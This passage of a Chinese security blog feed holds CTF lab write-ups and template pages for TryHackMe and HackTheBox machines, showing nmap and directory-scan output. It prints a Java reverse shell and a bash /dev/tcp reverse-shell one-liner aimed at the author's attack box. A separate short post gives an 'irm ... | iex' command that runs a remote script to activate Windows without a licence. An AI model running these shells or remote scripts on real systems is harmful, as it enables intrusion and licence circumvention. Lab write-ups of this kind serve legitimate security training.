href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">反向shell脚本</a>内容，完成脚本内容写入后–我们就可以尝试执行相关的反向shell脚本（注意先在攻击机上设置一个Netcat监听器），即可获得一个shell界面–身份为jenkins。<br><a href="/../assets/img/Pasted%20image%2020241123190238.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123190238.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=&quot;10.17.5.121&quot;;</span><br><span class="line">int port=4445;</span><br><span class="line">String cmd=&quot;/bin/bash&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241123190554.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123190554.png"></a><br>使用ssh访问root用户并检索root.txt文件内容。</p><p><a href="/../assets/img/Pasted%20image%2020241123190825.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241123190825.png"></a></p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-bookstoreoc</title>
      <link href="/2024/11/22/bookstoreoc/"/>
      <url>/2024/11/22/bookstoreoc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>具有基本 Web 枚举和 REST API 模糊测试的初级框。</p></blockquote><h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：  中<br><strong>描述</strong>：  具有基本 Web 枚举和 REST API 模糊测试的初级框。<br>Bookstore 是一台 boot2root CTF 机器，它教初学者渗透测试人员基本的 Web 枚举和 REST API 模糊测试</p><hr><h2 id="📋-基本信息"><a href="#📋-基本信息" class="headerlink" title="📋 基本信息"></a>📋 基本信息</h2><table><thead><tr><th>🚀</th><th><strong>本地机器信息</strong></th><th><strong>目标机器信息</strong></th></tr></thead><tbody><tr><td><strong>IP</strong></td><td><code>10.17.5.121</code></td><td>10.10.96.141</td></tr><tr><td><strong>OS</strong></td><td><code>Kali</code></td><td></td></tr></tbody></table><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="1-🛠️-端口扫描"><a href="#1-🛠️-端口扫描" class="headerlink" title="1. 🛠️ 端口扫描"></a>1. 🛠️ 端口扫描</h3><ul><li>使用工具如 <code>nmap</code> 或 <code>masscan</code> 进行端口扫描，发现目标机器开放的端口。  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~/SecLab/bookstoreoc]</span><br><span class="line">└─$ nmap -sCV -p22,80,5000 <span class="variable">$ip</span> -T4</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-22 23:54 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.96.141</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)</span><br><span class="line">|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)</span><br><span class="line">|_  256 10:9f:0b:<span class="built_in">dd</span>:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Book Store</span><br><span class="line">5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/api &lt;/p&gt;</span><br><span class="line">|_http-server-header: Werkzeug/0.14.1 Python/3.6.9</span><br><span class="line">|_http-title: Home</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.16 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-🔎-路径探测"><a href="#2-🔎-路径探测" class="headerlink" title="2. 🔎 路径探测"></a>2. 🔎 路径探测</h3><ul><li>扫描网站或系统的开放路径，寻找潜在的漏洞。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://10.17.5.121 -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line">dirb http://10.17.5.121</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-🧰-服务枚举"><a href="#3-🧰-服务枚举" class="headerlink" title="3. 🧰 服务枚举"></a>3. 🧰 服务枚举</h3><ul><li>对服务进行详细的枚举，寻找潜在漏洞。<ul><li>使用工具如 <code>nmap</code>、<code>nikto</code>、<code>dirbuster</code> 等。</li></ul></li></ul><hr><h2 id="🧠-渗透思路"><a href="#🧠-渗透思路" class="headerlink" title="🧠 渗透思路"></a>🧠 渗透思路</h2><h3 id="1-⚡-攻击向量"><a href="#1-⚡-攻击向量" class="headerlink" title="1. ⚡ 攻击向量"></a>1. ⚡ 攻击向量</h3><ul><li>根据目标机器暴露的服务和漏洞，选择攻击路径。<ul><li>如 Web 漏洞、SSH 漏洞等。</li></ul></li></ul><h3 id="2-💥-nday-利用"><a href="#2-💥-nday-利用" class="headerlink" title="2. 💥 nday 利用"></a>2. 💥 nday 利用</h3><ul><li>查找未打补丁的漏洞，利用公开的 <strong>nday</strong> 漏洞。<ul><li>通过 Metasploit 或自定义脚本进行利用。</li></ul></li></ul><h3 id="3-🔍-信息审计"><a href="#3-🔍-信息审计" class="headerlink" title="3. 🔍 信息审计"></a>3. 🔍 信息审计</h3><ul><li>审计目标系统，查找敏感信息或配置错误。<ul><li>通过配置文件、日志文件等进行信息审计。</li></ul></li></ul><hr><h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><ul><li><strong>Web 漏洞扫描</strong>：使用 Burp Suite、Nikto 等工具进行 Web 应用的扫描。</li><li><strong>漏洞利用</strong>：利用常见漏洞，如 SQL 注入、XSS 等，进行进一步测试。</li></ul><hr><h2 id="🔐-横向移动与后渗透操作"><a href="#🔐-横向移动与后渗透操作" class="headerlink" title="🔐 横向移动与后渗透操作"></a>🔐 横向移动与后渗透操作</h2><ul><li><strong>横向移动</strong>：一旦获取基础 shell，搜索网络内其他潜在目标，进行横向渗透。</li><li><strong>后渗透操作</strong>：<ol><li>获取敏感信息（如数据库、用户凭证）。</li><li>持久化访问，通过反向 shell、计划任务等手段保持连接。</li></ol></li></ul><hr><h2 id="🕵️‍♂️-漏洞利用"><a href="#🕵️‍♂️-漏洞利用" class="headerlink" title="🕵️‍♂️ 漏洞利用"></a>🕵️‍♂️ 漏洞利用</h2><h3 id="漏洞名称："><a href="#漏洞名称：" class="headerlink" title="漏洞名称：&lt;漏洞名称&gt;"></a>漏洞名称：&lt;漏洞名称&gt;</h3><ul><li><strong>描述</strong>：&lt;漏洞描述&gt;</li><li><strong>利用过程</strong>：<ol><li><strong>漏洞分析</strong>：&lt;简要描述漏洞的成因&gt;</li><li><strong>编写利用脚本</strong> 或 <strong>使用现有工具</strong>：&lt;如何利用&gt;</li><li><strong>验证漏洞是否有效</strong>：&lt;验证步骤&gt;</li><li><strong>获取相关权限或信息</strong>：&lt;攻击目标后获取的权限&gt;</li></ol></li></ul><hr><h2 id="💻-getshell"><a href="#💻-getshell" class="headerlink" title="💻 getshell"></a>💻 getshell</h2><ul><li><strong>描述</strong>：通过漏洞获取目标机器的 shell（命令行访问）。</li><li><strong>步骤</strong>：<ol><li>使用反向 shell 获取访问权限： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.17.5.121/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><strong>验证 shell 是否成功</strong>： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><hr><h2 id="🔨-提权"><a href="#🔨-提权" class="headerlink" title="🔨 提权"></a>🔨 提权</h2><ul><li><strong>描述</strong>：在目标系统中进行权限提升，获取 root 权限。</li><li><strong>步骤</strong>：<ol><li>查看当前用户和权限： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li><li>查找本地提权漏洞或配置错误：<ul><li>使用 <code>linpeas</code>、<code>GTFOBins</code> 查找提权方法。</li></ul></li><li>提升权限至 root 用户： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /bin/bash  <span class="comment"># 提升为 root</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><hr><h2 id="📚-知识点回顾"><a href="#📚-知识点回顾" class="headerlink" title="📚 知识点回顾"></a>📚 知识点回顾</h2><ul><li><strong>信息搜集技巧</strong>：<ul><li>端口扫描与服务枚举技巧。</li><li>Web 漏洞检测技巧（SQL 注入、XSS 等）。</li></ul></li><li><strong>漏洞利用技巧</strong>：<ul><li>如何使用 Metasploit 或自行编写漏洞利用脚本。</li><li>获取反向 shell 与持续访问。</li></ul></li><li><strong>Post-Exploitation 技巧</strong>：<ul><li>获取目标的敏感信息和访问权限。</li><li>提升权限，进行横向移动。</li></ul></li></ul><hr><h2 id="🧳-攻击链与流程图"><a href="#🧳-攻击链与流程图" class="headerlink" title="🧳 攻击链与流程图"></a>🧳 攻击链与流程图</h2><ul><li>可视化渗透测试的整体攻击过程，确保每一步都清晰。</li></ul><hr><h2 id="📅-总结"><a href="#📅-总结" class="headerlink" title="📅 总结"></a>📅 总结</h2><ul><li><strong>成功步骤</strong>：简要描述成功的渗透测试步骤和关键点。</li><li><strong>遇到的困难与挑战</strong>：列出在过程中遇到的难点及解决方案。</li><li><strong>后续建议</strong>：对靶场的进一步探索或防御建议。</li></ul></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-</title>
      <link href="/2024/11/22/thm-nax/"/>
      <url>/2024/11/22/thm-nax/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>一句话总结：</p></blockquote><h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：<br><strong>描述</strong>：  </p><hr><h2 id="📋-基本信息"><a href="#📋-基本信息" class="headerlink" title="📋 基本信息"></a>📋 基本信息</h2><table><thead><tr><th>🚀</th><th><strong>本地机器信息</strong></th><th><strong>目标机器信息</strong></th></tr></thead><tbody><tr><td><strong>IP</strong></td><td><code>10.17.5.121</code></td><td>10.10.61.3</td></tr><tr><td><strong>OS</strong></td><td><code>Kali</code></td><td></td></tr></tbody></table><hr><h2 id="🔍-信息搜集"><a href="#🔍-信息搜集" class="headerlink" title="🔍 信息搜集"></a>🔍 信息搜集</h2><h3 id="1-🛠️-端口扫描"><a href="#1-🛠️-端口扫描" class="headerlink" title="1. 🛠️ 端口扫描"></a>1. 🛠️ 端口扫描</h3><ul><li>使用工具如 <code>nmap</code> 或 <code>masscan</code> 进行端口扫描，发现目标机器开放的端口。  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 10.17.5.121  <span class="comment"># 执行全端口扫描</span></span><br><span class="line">nmap -sV -p &lt;端口&gt; 10.17.5.121  <span class="comment"># 扫描开放端口的服务版本</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-🔎-路径探测"><a href="#2-🔎-路径探测" class="headerlink" title="2. 🔎 路径探测"></a>2. 🔎 路径探测</h3><ul><li>扫描网站或系统的开放路径，寻找潜在的漏洞。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://10.17.5.121 -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line">dirb http://10.17.5.121</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-🧰-服务枚举"><a href="#3-🧰-服务枚举" class="headerlink" title="3. 🧰 服务枚举"></a>3. 🧰 服务枚举</h3><ul><li>对服务进行详细的枚举，寻找潜在漏洞。<ul><li>使用工具如 <code>nmap</code>、<code>nikto</code>、<code>dirbuster</code> 等。</li></ul></li></ul><hr><h2 id="🧠-渗透思路"><a href="#🧠-渗透思路" class="headerlink" title="🧠 渗透思路"></a>🧠 渗透思路</h2><h3 id="1-⚡-攻击向量"><a href="#1-⚡-攻击向量" class="headerlink" title="1. ⚡ 攻击向量"></a>1. ⚡ 攻击向量</h3><ul><li>根据目标机器暴露的服务和漏洞，选择攻击路径。<ul><li>如 Web 漏洞、SSH 漏洞等。</li></ul></li></ul><h3 id="2-💥-nday-利用"><a href="#2-💥-nday-利用" class="headerlink" title="2. 💥 nday 利用"></a>2. 💥 nday 利用</h3><ul><li>查找未打补丁的漏洞，利用公开的 <strong>nday</strong> 漏洞。<ul><li>通过 Metasploit 或自定义脚本进行利用。</li></ul></li></ul><h3 id="3-🔍-信息审计"><a href="#3-🔍-信息审计" class="headerlink" title="3. 🔍 信息审计"></a>3. 🔍 信息审计</h3><ul><li>审计目标系统，查找敏感信息或配置错误。<ul><li>通过配置文件、日志文件等进行信息审计。</li></ul></li></ul><hr><h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><ul><li><strong>Web 漏洞扫描</strong>：使用 Burp Suite、Nikto 等工具进行 Web 应用的扫描。</li><li><strong>漏洞利用</strong>：利用常见漏洞，如 SQL 注入、XSS 等，进行进一步测试。</li></ul><hr><h2 id="🔐-横向移动与后渗透操作"><a href="#🔐-横向移动与后渗透操作" class="headerlink" title="🔐 横向移动与后渗透操作"></a>🔐 横向移动与后渗透操作</h2><ul><li><strong>横向移动</strong>：一旦获取基础 shell，搜索网络内其他潜在目标，进行横向渗透。</li><li><strong>后渗透操作</strong>：<ol><li>获取敏感信息（如数据库、用户凭证）。</li><li>持久化访问，通过反向 shell、计划任务等手段保持连接。</li></ol></li></ul><hr><h2 id="🕵️‍♂️-漏洞利用"><a href="#🕵️‍♂️-漏洞利用" class="headerlink" title="🕵️‍♂️ 漏洞利用"></a>🕵️‍♂️ 漏洞利用</h2><h3 id="漏洞名称："><a href="#漏洞名称：" class="headerlink" title="漏洞名称：&lt;漏洞名称&gt;"></a>漏洞名称：&lt;漏洞名称&gt;</h3><ul><li><strong>描述</strong>：&lt;漏洞描述&gt;</li><li><strong>利用过程</strong>：<ol><li><strong>漏洞分析</strong>：&lt;简要描述漏洞的成因&gt;</li><li><strong>编写利用脚本</strong> 或 <strong>使用现有工具</strong>：&lt;如何利用&gt;</li><li><strong>验证漏洞是否有效</strong>：&lt;验证步骤&gt;</li><li><strong>获取相关权限或信息</strong>：&lt;攻击目标后获取的权限&gt;</li></ol></li></ul><hr><h2 id="💻-getshell"><a href="#💻-getshell" class="headerlink" title="💻 getshell"></a>💻 getshell</h2><ul><li><strong>描述</strong>：通过漏洞获取目标机器的 shell（命令行访问）。</li><li><strong>步骤</strong>：<ol><li>使用反向 shell 获取访问权限： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.17.5.121/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><strong>验证 shell 是否成功</strong>： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><hr><h2 id="🔨-提权"><a href="#🔨-提权" class="headerlink" title="🔨 提权"></a>🔨 提权</h2><ul><li><strong>描述</strong>：在目标系统中进行权限提升，获取 root 权限。</li><li><strong>步骤</strong>：<ol><li>查看当前用户和权限： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li><li>查找本地提权漏洞或配置错误：<ul><li>使用 <code>linpeas</code>、<code>GTFOBins</code> 查找提权方法。</li></ul></li><li>提升权限至 root 用户： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /bin/bash  <span class="comment"># 提升为 root</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><hr><h2 id="📚-知识点回顾"><a href="#📚-知识点回顾" class="headerlink" title="📚 知识点回顾"></a>📚 知识点回顾</h2><ul><li><strong>信息搜集技巧</strong>：<ul><li>端口扫描与服务枚举技巧。</li><li>Web 漏洞检测技巧（SQL 注入、XSS 等）。</li></ul></li><li><strong>漏洞利用技巧</strong>：<ul><li>如何使用 Metasploit 或自行编写漏洞利用脚本。</li><li>获取反向 shell 与持续访问。</li></ul></li><li><strong>Post-Exploitation 技巧</strong>：<ul><li>获取目标的敏感信息和访问权限。</li><li>提升权限，进行横向移动。</li></ul></li></ul><hr><h2 id="🧳-攻击链与流程图"><a href="#🧳-攻击链与流程图" class="headerlink" title="🧳 攻击链与流程图"></a>🧳 攻击链与流程图</h2><ul><li>可视化渗透测试的整体攻击过程，确保每一步都清晰。</li></ul><hr><h2 id="📅-总结"><a href="#📅-总结" class="headerlink" title="📅 总结"></a>📅 总结</h2><ul><li><strong>成功步骤</strong>：简要描述成功的渗透测试步骤和关键点。</li><li><strong>遇到的困难与挑战</strong>：列出在过程中遇到的难点及解决方案。</li><li><strong>后续建议</strong>：对靶场的进一步探索或防御建议。</li></ul></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Nax</title>
      <link href="/2024/11/22/nax/"/>
      <url>/2024/11/22/nax/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： Middle<br>描述：识别市场上功能最强大、最值得信赖的网络监控软件中的关键安全漏洞，该漏洞允许用户进行身份验证执行远程代码。</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.61.3</td></tr><tr><td>OS</td><td>kali</td><td></td></tr></tbody></table><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li>端口扫描</li><li>路径探测</li><li>服务枚举</li></ol><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><ol><li>攻击向量</li><li>nday利用</li><li>信息审计</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows激活工具|命令行</title>
      <link href="/2024/11/22/WindowsActivate/"/>
      <url>/2024/11/22/WindowsActivate/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>输入Win+R 带来cmd 输入下行代码可以进行激活</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irm https://get.activated.win | iex</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THB-Axlle-域内邮件钓n鱼到系统权限提升的渗透实践</title>
      <link href="/2024/11/22/Axlle/"/>
      <url>/2024/11/22/Axlle/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>域内邮件钓鱼到系统权限提升的渗透实践</p></blockquote><h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：Hard<br><strong>描述</strong>：通过邮件钓鱼突破边界，最终实现域内渗透的靶场练习</p><hr><h2 id="📋-基本信息"><a href="#📋-基本信息" class="headerlink" title="📋 基本信息"></a>📋 基本信息</h2><table><thead><tr><th>🚀</th><th><strong>本地机器信息</strong></th><th><strong>目标机器信息</strong></th></tr></thead><tbody><tr><td><strong>IP</strong></td><td>10.10.16.27</td><td>10.10.11.21</td></tr><tr><td><strong>OS</strong></td><td><code>Kali</code></td><td>Windows</td></tr></tbody></table><hr><h2 id="🔍-信息搜集"><a href="#🔍-信息搜集" class="headerlink" title="🔍 信息搜集"></a>🔍 信息搜集</h2><h3 id="1-🛠️-端口扫描"><a href="#1-🛠️-端口扫描" class="headerlink" title="1. 🛠️ 端口扫描"></a>1. 🛠️ 端口扫描</h3><p>首先使用 <code>naabu</code> 进行快速端口扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ naabu --host 10.10.11.21 &gt; ports.txt</span><br><span class="line"></span><br><span class="line">[INF] Found 8 ports on host 10.10.11.21 (10.10.11.21)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整理开放端口列表</span></span><br><span class="line">❯ <span class="built_in">cut</span> -d <span class="string">&quot;:&quot;</span> -f2 ports.txt | <span class="built_in">paste</span> -sd,</span><br><span class="line">80,53,135,139,389,445,88,25</span><br></pre></td></tr></table></figure><p>接着使用 <code>nmap</code> 进行详细的版本探测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV -p 80,53,135,139,389,445,88,25 10.10.11.21 -T4</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE       VERSION                             </span><br><span class="line">25/tcp  open  smtp         hMailServer smtpd                                                                                   </span><br><span class="line">| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP     </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                                                   </span><br><span class="line">53/tcp  open  domain       Simple DNS Plus                                                                                     </span><br><span class="line">80/tcp  open  http         Microsoft IIS httpd 10.0                                                                            </span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0                                                                                        </span><br><span class="line">88/tcp  open  kerberos-sec Microsoft Windows Kerberos</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC            </span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn       </span><br><span class="line">389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: axlle.htb0.)        </span><br><span class="line">445/tcp open  microsoft-ds Windows Server SMB</span><br></pre></td></tr></table></figure><h3 id="2-🔎-服务枚举"><a href="#2-🔎-服务枚举" class="headerlink" title="2. 🔎 服务枚举"></a>2. 🔎 服务枚举</h3><h4 id="SMTP-服务-25-TCP"><a href="#SMTP-服务-25-TCP" class="headerlink" title="SMTP 服务 (25&#x2F;TCP)"></a>SMTP 服务 (25&#x2F;TCP)</h4><ul><li>运行 <code>hMailServer smtpd</code></li><li>支持的命令：<ul><li><code>AUTH LOGIN</code>: 支持认证登录</li><li><code>VRFY</code>: 可能用于用户枚举</li><li><code>SIZE 20480000</code>: 最大邮件大小限制</li></ul></li></ul><h4 id="DNS-服务-53-TCP"><a href="#DNS-服务-53-TCP" class="headerlink" title="DNS 服务 (53&#x2F;TCP)"></a>DNS 服务 (53&#x2F;TCP)</h4><ul><li>运行 <code>Simple DNS Plus</code></li><li>域名：<code>axlle.htb0</code></li></ul><h4 id="Web-服务-80-TCP"><a href="#Web-服务-80-TCP" class="headerlink" title="Web 服务 (80&#x2F;TCP)"></a>Web 服务 (80&#x2F;TCP)</h4><ul><li>Microsoft IIS 10.0</li><li>需进行详细的 Web 应用测试</li></ul><h4 id="域控服务"><a href="#域控服务" class="headerlink" title="域控服务"></a>域控服务</h4><ul><li>Kerberos (88&#x2F;TCP)</li><li>LDAP (389&#x2F;TCP): Active Directory LDAP</li><li>NetBIOS (139&#x2F;TCP)</li><li>SMB 